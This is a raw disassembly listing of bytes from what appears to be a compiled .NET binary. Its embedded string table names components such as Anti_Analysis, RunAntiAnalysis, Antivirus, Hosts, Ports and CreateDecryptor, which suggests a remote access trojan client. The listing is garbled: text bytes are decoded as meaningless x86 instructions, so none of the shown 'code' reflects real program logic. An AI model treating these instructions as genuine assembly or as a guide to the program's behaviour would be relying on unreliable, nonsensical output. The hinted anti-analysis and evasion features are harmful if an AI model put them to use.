  408c3b:	72 63                	jb     0x408ca0
  408c3d:	68 65 72 00 53       	push   $0x53007265
  408c42:	65 73 73             	gs jae 0x408cb8
  408c45:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4d:	67 45                	addr16 inc %ebp
  408c4f:	76 65                	jbe    0x408cb6
  408c51:	6e                   	outsb  %ds:(%esi),(%dx)
  408c52:	74 48                	je     0x408c9c
  408c54:	61                   	popa
  408c55:	6e                   	outsb  %ds:(%esi),(%dx)
  408c56:	64 6c                	fs insb (%dx),%es:(%edi)
  408c58:	65 72 00             	gs jb  0x408c5b
  408c5b:	54                   	push   %esp
  408c5c:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c63:	6e                   	outsb  %ds:(%esi),(%dx)
  408c64:	65 72 00             	gs jb  0x408c67
  408c67:	43                   	inc    %ebx
  408c68:	6c                   	insb   (%dx),%es:(%edi)
  408c69:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c70:	6c                   	insb   (%dx),%es:(%edi)
  408c71:	70 65                	jo     0x408cd8
  408c73:	72 00                	jb     0x408c75
  408c75:	54                   	push   %esp
  408c76:	6f                   	outsl  %ds:(%esi),(%dx)
  408c77:	55                   	push   %ebp
  408c78:	70 70                	jo     0x408cea
  408c7a:	65 72 00             	gs jb  0x408c7d
  408c7d:	44                   	inc    %esp
  408c7e:	65 74 65             	gs je  0x408ce6
  408c81:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c85:	6e                   	outsb  %ds:(%esi),(%dx)
  408c86:	75 66                	jne    0x408cee
  408c88:	61                   	popa
  408c89:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c8d:	65 72 00             	gs jb  0x408c90
  408c90:	43                   	inc    %ebx
  408c91:	75 72                	jne    0x408d05
  408c93:	72 65                	jb     0x408cfa
  408c95:	6e                   	outsb  %ds:(%esi),(%dx)
  408c96:	74 55                	je     0x408ced
  408c98:	73 65                	jae    0x408cff
  408c9a:	72 00                	jb     0x408c9c
  408c9c:	53                   	push   %ebx
  408c9d:	74 72                	je     0x408d11
  408c9f:	65 61                	gs popa
  408ca1:	6d                   	insl   (%dx),%es:(%edi)
  408ca2:	57                   	push   %edi
  408ca3:	72 69                	jb     0x408d0e
  408ca5:	74 65                	je     0x408d0c
  408ca7:	72 00                	jb     0x408ca9
  408ca9:	54                   	push   %esp
  408caa:	65 78 74             	gs js  0x408d21
  408cad:	57                   	push   %edi
  408cae:	72 69                	jb     0x408d19
  408cb0:	74 65                	je     0x408d17
  408cb2:	72 00                	jb     0x408cb4
  408cb4:	45                   	inc    %ebp
  408cb5:	6e                   	outsb  %ds:(%esi),(%dx)
  408cb6:	74 65                	je     0x408d1d
  408cb8:	72 00                	jb     0x408cba
  408cba:	42                   	inc    %edx
  408cbb:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cc2:	72 
  408cc3:	74 65                	je     0x408d2a
  408cc5:	72 00                	jb     0x408cc7
  408cc7:	54                   	push   %esp
  408cc8:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc9:	4c                   	dec    %esp
  408cca:	6f                   	outsl  %ds:(%esi),(%dx)
  408ccb:	77 65                	ja     0x408d32
  408ccd:	72 00                	jb     0x408ccf
  408ccf:	45                   	inc    %ebp
  408cd0:	72 72                	jb     0x408d44
  408cd2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd3:	72 00                	jb     0x408cd5
  408cd5:	49                   	dec    %ecx
  408cd6:	45                   	inc    %ebp
  408cd7:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd8:	75 6d                	jne    0x408d47
  408cda:	65 72 61             	gs jb  0x408d3e
  408cdd:	74 6f                	je     0x408d4e
  408cdf:	72 00                	jb     0x408ce1
  408ce1:	4d                   	dec    %ebp
  408ce2:	61                   	popa
  408ce3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ce4:	61                   	popa
  408ce5:	67 65 6d             	gs insl (%dx),%es:(%di)
  408ce8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cea:	74 4f                	je     0x408d3b
  408cec:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cef:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408cf3:	75 6d                	jne    0x408d62
  408cf5:	65 72 61             	gs jb  0x408d59
  408cf8:	74 6f                	je     0x408d69
  408cfa:	72 00                	jb     0x408cfc
  408cfc:	53                   	push   %ebx
  408cfd:	79 73                	jns    0x408d72
  408cff:	74 65                	je     0x408d66
  408d01:	6d                   	insl   (%dx),%es:(%edi)
  408d02:	2e 43                	cs inc %ebx
  408d04:	6f                   	outsl  %ds:(%esi),(%dx)
  408d05:	6c                   	insb   (%dx),%es:(%edi)
  408d06:	6c                   	insb   (%dx),%es:(%edi)
  408d07:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408d0c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0d:	73 2e                	jae    0x408d3d
  408d0f:	49                   	dec    %ecx
  408d10:	45                   	inc    %ebp
  408d11:	6e                   	outsb  %ds:(%esi),(%dx)
  408d12:	75 6d                	jne    0x408d81
  408d14:	65 72 61             	gs jb  0x408d78
  408d17:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d1b:	47                   	inc    %edi
  408d1c:	65 74 45             	gs je  0x408d64
  408d1f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d20:	75 6d                	jne    0x408d8f
  408d22:	65 72 61             	gs jb  0x408d86
  408d25:	74 6f                	je     0x408d96
  408d27:	72 00                	jb     0x408d29
  408d29:	41                   	inc    %ecx
  408d2a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d2e:	61                   	popa
  408d2f:	74 6f                	je     0x408da0
  408d31:	72 00                	jb     0x408d33
  408d33:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d38:	00 2e                	add    %ch,(%esi)
  408d3a:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d3d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d3e:	72 00                	jb     0x408d40
  408d40:	4d                   	dec    %ebp
  408d41:	6f                   	outsl  %ds:(%esi),(%dx)
  408d42:	6e                   	outsb  %ds:(%esi),(%dx)
  408d43:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d4a:	65 
  408d4b:	61                   	popa
  408d4c:	74 65                	je     0x408db3
  408d4e:	44                   	inc    %esp
  408d4f:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d53:	70 74                	jo     0x408dc9
  408d55:	6f                   	outsl  %ds:(%esi),(%dx)
  408d56:	72 00                	jb     0x408d58
  408d58:	43                   	inc    %ebx
  408d59:	72 65                	jb     0x408dc0
  408d5b:	61                   	popa
  408d5c:	74 65                	je     0x408dc3
  408d5e:	45                   	inc    %ebp
  408d5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d60:	63 72 79             	arpl   %esi,0x79(%edx)
  408d63:	70 74                	jo     0x408dd9
  408d65:	6f                   	outsl  %ds:(%esi),(%dx)
  408d66:	72 00                	jb     0x408d68
  408d68:	49                   	dec    %ecx
  408d69:	6e                   	outsb  %ds:(%esi),(%dx)
  408d6a:	74 50                	je     0x408dbc
  408d6c:	74 72                	je     0x408de0
  408d6e:	00 53 79             	add    %dl,0x79(%ebx)
  408d71:	73 74                	jae    0x408de7
  408d73:	65 6d                	gs insl (%dx),%es:(%edi)
  408d75:	2e 44                	cs inc %esp
  408d77:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d7e:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d85:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d8c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d8d:	64 73 00             	fs jae 0x408d90
  408d90:	4d                   	dec    %ebp
  408d91:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d98:	74 2e                	je     0x408dc8
  408d9a:	56                   	push   %esi
  408d9b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408da2:	73 69                	jae    0x408e0d
  408da4:	63 2e                	arpl   %ebp,(%esi)
  408da6:	44                   	inc    %esp
  408da7:	65 76 69             	gs jbe 0x408e13
  408daa:	63 65 73             	arpl   %esp,0x73(%ebp)
  408dad:	00 53 79             	add    %dl,0x79(%ebx)
  408db0:	73 74                	jae    0x408e26
  408db2:	65 6d                	gs insl (%dx),%es:(%edi)
  408db4:	2e 52                	cs push %edx
  408db6:	75 6e                	jne    0x408e26
  408db8:	74 69                	je     0x408e23
  408dba:	6d                   	insl   (%dx),%es:(%edi)
  408dbb:	65 2e 49             	gs cs dec %ecx
  408dbe:	6e                   	outsb  %ds:(%esi),(%dx)
  408dbf:	74 65                	je     0x408e26
  408dc1:	72 6f                	jb     0x408e32
  408dc3:	70 53                	jo     0x408e18
  408dc5:	65 72 76             	gs jb  0x408e3e
  408dc8:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dcf:	73 74                	jae    0x408e45
  408dd1:	65 6d                	gs insl (%dx),%es:(%edi)
  408dd3:	2e 52                	cs push %edx
  408dd5:	75 6e                	jne    0x408e45
  408dd7:	74 69                	je     0x408e42
  408dd9:	6d                   	insl   (%dx),%es:(%edi)
  408dda:	65 2e 43             	gs cs inc %ebx
  408ddd:	6f                   	outsl  %ds:(%esi),(%dx)
  408dde:	6d                   	insl   (%dx),%es:(%edi)
  408ddf:	70 69                	jo     0x408e4a
  408de1:	6c                   	insb   (%dx),%es:(%edi)
  408de2:	65 72 53             	gs jb  0x408e38
  408de5:	65 72 76             	gs jb  0x408e5e
  408de8:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408def:	62 75 67             	bound  %esi,0x67(%ebp)
  408df2:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408df9:	65 
  408dfa:	73 00                	jae    0x408dfc
  408dfc:	45                   	inc    %ebp
  408dfd:	78 70                	js     0x408e6f
  408dff:	61                   	popa
  408e00:	6e                   	outsb  %ds:(%esi),(%dx)
  408e01:	64 45                	fs inc %ebp
  408e03:	6e                   	outsb  %ds:(%esi),(%dx)
  408e04:	76 69                	jbe    0x408e6f
  408e06:	72 6f                	jb     0x408e77
  408e08:	6e                   	outsb  %ds:(%esi),(%dx)
  408e09:	6d                   	insl   (%dx),%es:(%edi)
  408e0a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e0c:	74 56                	je     0x408e64
  408e0e:	61                   	popa
  408e0f:	72 69                	jb     0x408e7a
  408e11:	61                   	popa
  408e12:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e16:	00 47 65             	add    %al,0x65(%edi)
  408e19:	74 50                	je     0x408e6b
  408e1b:	72 6f                	jb     0x408e8c
  408e1d:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e20:	73 65                	jae    0x408e87
  408e22:	73 00                	jae    0x408e24
  408e24:	47                   	inc    %edi
  408e25:	65 74 48             	gs je  0x408e70
  408e28:	6f                   	outsl  %ds:(%esi),(%dx)
  408e29:	73 74                	jae    0x408e9f
  408e2b:	41                   	inc    %ecx
  408e2c:	64 64 72 65          	fs fs jb 0x408e95
  408e30:	73 73                	jae    0x408ea5
  408e32:	65 73 00             	gs jae 0x408e35
  408e35:	53                   	push   %ebx
  408e36:	79 73                	jns    0x408eab
  408e38:	74 65                	je     0x408e9f
  408e3a:	6d                   	insl   (%dx),%es:(%edi)
  408e3b:	2e 53                	cs push %ebx
  408e3d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e41:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e48:	70 
  408e49:	74 6f                	je     0x408eba
  408e4b:	67 72 61             	addr16 jb 0x408eaf
  408e4e:	70 68                	jo     0x408eb8
  408e50:	79 2e                	jns    0x408e80
  408e52:	58                   	pop    %eax
  408e53:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e58:	72 74                	jb     0x408ece
  408e5a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e61:	73 00                	jae    0x408e63
  408e63:	45                   	inc    %ebp
  408e64:	6e                   	outsb  %ds:(%esi),(%dx)
  408e65:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e68:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e6c:	74 65                	je     0x408ed3
  408e6e:	73 00                	jae    0x408e70
  408e70:	47                   	inc    %edi
  408e71:	65 74 55             	gs je  0x408ec9
  408e74:	74 66                	je     0x408edc
  408e76:	38 42 79             	cmp    %al,0x79(%edx)
  408e79:	74 65                	je     0x408ee0
  408e7b:	73 00                	jae    0x408e7d
  408e7d:	75 74                	jne    0x408ef3
  408e7f:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e83:	74 65                	je     0x408eea
  408e85:	73 00                	jae    0x408e87
  408e87:	52                   	push   %edx
  408e88:	66 63 32             	arpl   %si,(%edx)
  408e8b:	38 39                	cmp    %bh,(%ecx)
  408e8d:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e91:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e98:	73 00                	jae    0x408e9a
  408e9a:	52                   	push   %edx
  408e9b:	65 61                	gs popa
  408e9d:	64 41                	fs inc %ecx
  408e9f:	6c                   	insb   (%dx),%es:(%edi)
  408ea0:	6c                   	insb   (%dx),%es:(%edi)
  408ea1:	42                   	inc    %edx
  408ea2:	79 74                	jns    0x408f18
  408ea4:	65 73 00             	gs jae 0x408ea7
  408ea7:	44                   	inc    %esp
  408ea8:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408eac:	65 46                	gs inc %esi
  408eae:	72 6f                	jb     0x408f1f
  408eb0:	6d                   	insl   (%dx),%es:(%edi)
  408eb1:	42                   	inc    %edx
  408eb2:	79 74                	jns    0x408f28
  408eb4:	65 73 00             	gs jae 0x408eb7
  408eb7:	53                   	push   %ebx
  408eb8:	77 61                	ja     0x408f1b
  408eba:	70 42                	jo     0x408efe
  408ebc:	79 74                	jns    0x408f32
  408ebe:	65 73 00             	gs jae 0x408ec1
  408ec1:	4c                   	dec    %esp
  408ec2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec3:	61                   	popa
  408ec4:	64 46                	fs inc %esi
  408ec6:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ecd:	74 
  408ece:	65 73 00             	gs jae 0x408ed1
  408ed1:	47                   	inc    %edi
  408ed2:	65 74 41             	gs je  0x408f16
  408ed5:	73 42                	jae    0x408f19
  408ed7:	79 74                	jns    0x408f4d
  408ed9:	65 73 00             	gs jae 0x408edc
  408edc:	53                   	push   %ebx
  408edd:	65 74 41             	gs je  0x408f21
  408ee0:	73 42                	jae    0x408f24
  408ee2:	79 74                	jns    0x408f58
  408ee4:	65 73 00             	gs jae 0x408ee7
  408ee7:	47                   	inc    %edi
  408ee8:	65 74 42             	gs je  0x408f2d
  408eeb:	79 74                	jns    0x408f61
  408eed:	65 73 00             	gs jae 0x408ef0
  408ef0:	72 61                	jb     0x408f53
  408ef2:	77 42                	ja     0x408f36
  408ef4:	79 74                	jns    0x408f6a
  408ef6:	65 73 00             	gs jae 0x408ef9
  408ef9:	62 79 74             	bound  %edi,0x74(%ecx)
  408efc:	65 73 00             	gs jae 0x408eff
  408eff:	43                   	inc    %ebx
  408f00:	53                   	push   %ebx
  408f01:	68 61 72 70 41       	push   $0x41707261
  408f06:	72 67                	jb     0x408f6f
  408f08:	75 6d                	jne    0x408f77
  408f0a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f0c:	74 49                	je     0x408f57
  408f0e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f0f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f11:	46                   	inc    %esi
  408f12:	6c                   	insb   (%dx),%es:(%edi)
  408f13:	61                   	popa
  408f14:	67 73 00             	addr16 jae 0x408f17
  408f17:	43                   	inc    %ebx
  408f18:	53                   	push   %ebx
  408f19:	68 61 72 70 42       	push   $0x42707261
  408f1e:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f25:	61                   	popa
  408f26:	67 73 00             	addr16 jae 0x408f29
  408f29:	65 73 46             	gs jae 0x408f72
  408f2c:	6c                   	insb   (%dx),%es:(%edi)
  408f2d:	61                   	popa
  408f2e:	67 73 00             	addr16 jae 0x408f31
  408f31:	53                   	push   %ebx
  408f32:	74 72                	je     0x408fa6
  408f34:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f3b:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f42:	65 
  408f43:	53                   	push   %ebx
  408f44:	65 74 74             	gs je  0x408fbb
  408f47:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f4e:	73 73                	jae    0x408fc3
  408f50:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f57:	6e                   	outsb  %ds:(%esi),(%dx)
  408f58:	67 45                	addr16 inc %ebp
  408f5a:	76 65                	jbe    0x408fc1
  408f5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5d:	74 41                	je     0x408fa0
  408f5f:	72 67                	jb     0x408fc8
  408f61:	73 00                	jae    0x408f63
  408f63:	41                   	inc    %ecx
  408f64:	6e                   	outsb  %ds:(%esi),(%dx)
  408f65:	74 69                	je     0x408fd0
  408f67:	5f                   	pop    %edi
  408f68:	41                   	inc    %ecx
  408f69:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6a:	61                   	popa
  408f6b:	6c                   	insb   (%dx),%es:(%edi)
  408f6c:	79 73                	jns    0x408fe1
  408f6e:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f75:	6e                   	outsb  %ds:(%esi),(%dx)
  408f76:	74 69                	je     0x408fe1
  408f78:	41                   	inc    %ecx
  408f79:	6e                   	outsb  %ds:(%esi),(%dx)
  408f7a:	61                   	popa
  408f7b:	6c                   	insb   (%dx),%es:(%edi)
  408f7c:	79 73                	jns    0x408ff1
  408f7e:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f85:	73 00                	jae    0x408f87
  408f87:	49                   	dec    %ecx
  408f88:	43                   	inc    %ebx
  408f89:	72 65                	jb     0x408ff0
  408f8b:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f8e:	74 69                	je     0x408ff9
  408f90:	61                   	popa
  408f91:	6c                   	insb   (%dx),%es:(%edi)
  408f92:	73 00                	jae    0x408f94
  408f94:	73 65                	jae    0x408ffb
  408f96:	74 5f                	je     0x408ff7
  408f98:	43                   	inc    %ebx
  408f99:	72 65                	jb     0x409000
  408f9b:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f9e:	74 69                	je     0x409009
  408fa0:	61                   	popa
  408fa1:	6c                   	insb   (%dx),%es:(%edi)
  408fa2:	73 00                	jae    0x408fa4
  408fa4:	45                   	inc    %ebp
  408fa5:	71 75                	jno    0x40901c
  408fa7:	61                   	popa
  408fa8:	6c                   	insb   (%dx),%es:(%edi)
  408fa9:	73 00                	jae    0x408fab
  408fab:	53                   	push   %ebx
  408fac:	73 6c                	jae    0x40901a
  408fae:	50                   	push   %eax
  408faf:	72 6f                	jb     0x409020
  408fb1:	74 6f                	je     0x409022
  408fb3:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fb6:	73 00                	jae    0x408fb8
  408fb8:	52                   	push   %edx
  408fb9:	65 61                	gs popa
  408fbb:	64 54                	fs push %esp
  408fbd:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbf:	6c                   	insb   (%dx),%es:(%edi)
  408fc0:	73 00                	jae    0x408fc2
  408fc2:	57                   	push   %edi
  408fc3:	72 69                	jb     0x40902e
  408fc5:	74 65                	je     0x40902c
  408fc7:	54                   	push   %esp
  408fc8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc9:	6f                   	outsl  %ds:(%esi),(%dx)
  408fca:	6c                   	insb   (%dx),%es:(%edi)
  408fcb:	73 00                	jae    0x408fcd
  408fcd:	42                   	inc    %edx
  408fce:	79 74                	jns    0x409044
  408fd0:	65 73 54             	gs jae 0x409027
  408fd3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd4:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd5:	6c                   	insb   (%dx),%es:(%edi)
  408fd6:	73 00                	jae    0x408fd8
  408fd8:	53                   	push   %ebx
  408fd9:	79 73                	jns    0x40904e
  408fdb:	74 65                	je     0x409042
  408fdd:	6d                   	insl   (%dx),%es:(%edi)
  408fde:	2e 57                	cs push %edi
  408fe0:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fe7:	46                   	inc    %esi
  408fe8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe9:	72 6d                	jb     0x409058
  408feb:	73 00                	jae    0x408fed
  408fed:	44                   	inc    %esp
  408fee:	6e                   	outsb  %ds:(%esi),(%dx)
  408fef:	73 00                	jae    0x408ff1
  408ff1:	43                   	inc    %ebx
  408ff2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff4:	74 61                	je     0x409057
  408ff6:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408ffd:	74 65                	je     0x409064
  408fff:	6d                   	insl   (%dx),%es:(%edi)
  409000:	2e 43                	cs inc %ebx
  409002:	6f                   	outsl  %ds:(%esi),(%dx)
  409003:	6c                   	insb   (%dx),%es:(%edi)
  409004:	6c                   	insb   (%dx),%es:(%edi)
  409005:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40900a:	6e                   	outsb  %ds:(%esi),(%dx)
  40900b:	73 00                	jae    0x40900d
  40900d:	53                   	push   %ebx
  40900e:	74 72                	je     0x409082
  409010:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409017:	74 4f                	je     0x409068
  409019:	70 74                	jo     0x40908f
  40901b:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409022:	74 49                	je     0x40906d
  409024:	6d                   	insl   (%dx),%es:(%edi)
  409025:	61                   	popa
  409026:	67 65 44             	addr16 gs inc %esp
  409029:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  40902d:	65 72 73             	gs jb  0x4090a3
  409030:	00 52 75             	add    %dl,0x75(%edx)
  409033:	6e                   	outsb  %ds:(%esi),(%dx)
  409034:	74 69                	je     0x40909f
  409036:	6d                   	insl   (%dx),%es:(%edi)
  409037:	65 48                	gs dec %eax
  409039:	65 6c                	gs insb (%dx),%es:(%edi)
  40903b:	70 65                	jo     0x4090a2
  40903d:	72 73                	jb     0x4090b2
  40903f:	00 53 73             	add    %dl,0x73(%ebx)
  409042:	6c                   	insb   (%dx),%es:(%edi)
  409043:	50                   	push   %eax
  409044:	6f                   	outsl  %ds:(%esi),(%dx)
  409045:	6c                   	insb   (%dx),%es:(%edi)
  409046:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40904d:	72 73                	jb     0x4090c2
  40904f:	00 73 73             	add    %dh,0x73(%ebx)
  409052:	6c                   	insb   (%dx),%es:(%edi)
  409053:	50                   	push   %eax
  409054:	6f                   	outsl  %ds:(%esi),(%dx)
  409055:	6c                   	insb   (%dx),%es:(%edi)
  409056:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40905d:	72 73                	jb     0x4090d2
  40905f:	00 46 69             	add    %al,0x69(%esi)
  409062:	6c                   	insb   (%dx),%es:(%edi)
  409063:	65 41                	gs inc %ecx
  409065:	63 63 65             	arpl   %esp,0x65(%ebx)
  409068:	73 73                	jae    0x4090dd
  40906a:	00 68 50             	add    %ch,0x50(%eax)
  40906d:	72 6f                	jb     0x4090de
  40906f:	63 65 73             	arpl   %esp,0x73(%ebp)
  409072:	73 00                	jae    0x409074
  409074:	47                   	inc    %edi
  409075:	65 74 43             	gs je  0x4090bb
  409078:	75 72                	jne    0x4090ec
  40907a:	72 65                	jb     0x4090e1
  40907c:	6e                   	outsb  %ds:(%esi),(%dx)
  40907d:	74 50                	je     0x4090cf
  40907f:	72 6f                	jb     0x4090f0
  409081:	63 65 73             	arpl   %esp,0x73(%ebp)
  409084:	73 00                	jae    0x409086
  409086:	49                   	dec    %ecx
  409087:	50                   	push   %eax
  409088:	41                   	inc    %ecx
  409089:	64 64 72 65          	fs fs jb 0x4090f2
  40908d:	73 73                	jae    0x409102
  40908f:	00 43 6f             	add    %al,0x6f(%ebx)
  409092:	6d                   	insl   (%dx),%es:(%edi)
  409093:	70 72                	jo     0x409107
  409095:	65 73 73             	gs jae 0x40910b
  409098:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40909c:	6f                   	outsl  %ds:(%esi),(%dx)
  40909d:	6d                   	insl   (%dx),%es:(%edi)
  40909e:	70 72                	jo     0x409112
  4090a0:	65 73 73             	gs jae 0x409116
  4090a3:	00 53 79             	add    %dl,0x79(%ebx)
  4090a6:	73 74                	jae    0x40911c
  4090a8:	65 6d                	gs insl (%dx),%es:(%edi)
  4090aa:	2e 4e                	cs dec %esi
  4090ac:	65 74 2e             	gs je  0x4090dd
  4090af:	53                   	push   %ebx
  4090b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090b1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090b4:	74 73                	je     0x409129
  4090b6:	00 73 65             	add    %dh,0x65(%ebx)
  4090b9:	74 5f                	je     0x40911a
  4090bb:	41                   	inc    %ecx
  4090bc:	72 67                	jb     0x409125
  4090be:	75 6d                	jne    0x40912d
  4090c0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090c2:	74 73                	je     0x409137
  4090c4:	00 53 79             	add    %dl,0x79(%ebx)
  4090c7:	73 74                	jae    0x40913d
  4090c9:	65 6d                	gs insl (%dx),%es:(%edi)
  4090cb:	45                   	inc    %ebp
  4090cc:	76 65                	jbe    0x409133
  4090ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4090cf:	74 73                	je     0x409144
  4090d1:	00 50 6f             	add    %dl,0x6f(%eax)
  4090d4:	72 74                	jb     0x40914a
  4090d6:	73 00                	jae    0x4090d8
  4090d8:	45                   	inc    %ebp
  4090d9:	78 69                	js     0x409144
  4090db:	73 74                	jae    0x409151
  4090dd:	73 00                	jae    0x4090df
  4090df:	48                   	dec    %eax
  4090e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e1:	73 74                	jae    0x409157
  4090e3:	73 00                	jae    0x4090e5
  4090e5:	41                   	inc    %ecx
  4090e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e7:	74 69                	je     0x409152
  4090e9:	76 69                	jbe    0x409154
  4090eb:	72 75                	jb     0x409162
  4090ed:	73 00                	jae    0x4090ef
  4090ef:	43                   	inc    %ebx
  4090f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f2:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090f5:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090f8:	61                   	popa
  4090f9:	67 65 46             	addr16 gs inc %esi
  4090fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4090fd:	72 6d                	jb     0x40916c
  4090ff:	61                   	popa
  409100:	74 00                	je     0x409102
  409102:	66 6f                	outsw  %ds:(%esi),(%dx)
  409104:	72 6d                	jb     0x409173
  409106:	61                   	popa
  409107:	74 00                	je     0x409109
  409109:	57                   	push   %edi
  40910a:	72 69                	jb     0x409175
  40910c:	74 65                	je     0x409173
  40910e:	46                   	inc    %esi
  40910f:	6c                   	insb   (%dx),%es:(%edi)
  409110:	6f                   	outsl  %ds:(%esi),(%dx)
  409111:	61                   	popa
  409112:	74 00                	je     0x409114
  409114:	67 65 74 5f          	addr16 gs je 0x409177
  409118:	41                   	inc    %ecx
  409119:	73 46                	jae    0x409161
  40911b:	6c                   	insb   (%dx),%es:(%edi)
  40911c:	6f                   	outsl  %ds:(%esi),(%dx)
  40911d:	61                   	popa
  40911e:	74 00                	je     0x409120
  409120:	73 65                	jae    0x409187
  409122:	74 5f                	je     0x409183
  409124:	41                   	inc    %ecx
  409125:	73 46                	jae    0x40916d
  409127:	6c                   	insb   (%dx),%es:(%edi)
  409128:	6f                   	outsl  %ds:(%esi),(%dx)
  409129:	61                   	popa
  40912a:	74 00                	je     0x40912c
  40912c:	47                   	inc    %edi
  40912d:	65 74 41             	gs je  0x409171
  409130:	73 46                	jae    0x409178
  409132:	6c                   	insb   (%dx),%es:(%edi)
  409133:	6f                   	outsl  %ds:(%esi),(%dx)
  409134:	61                   	popa
  409135:	74 00                	je     0x409137
  409137:	53                   	push   %ebx
  409138:	65 74 41             	gs je  0x40917c
  40913b:	73 46                	jae    0x409183
  40913d:	6c                   	insb   (%dx),%es:(%edi)
